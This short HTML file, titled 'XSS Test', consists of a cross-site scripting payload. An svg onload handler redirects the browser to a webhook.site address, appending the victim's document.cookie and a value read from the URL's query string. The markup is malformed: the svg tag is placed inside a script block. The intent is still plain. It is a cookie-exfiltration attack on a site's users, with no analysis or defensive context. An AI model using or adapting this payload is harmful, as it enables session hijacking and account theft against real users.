<!DOCTYPE html>

    <title>XSS Test</title>

<body>
    <script>
        const params = new URLSearchParams(window.location.search);
        const cookies = params.get('cookies');
        <svg onload="window.location.href='https://webhook.site/your-webhook-id?cookies=' + encodeURIComponent(document.cookie) + cookies"></svg>
    </script>
</body>
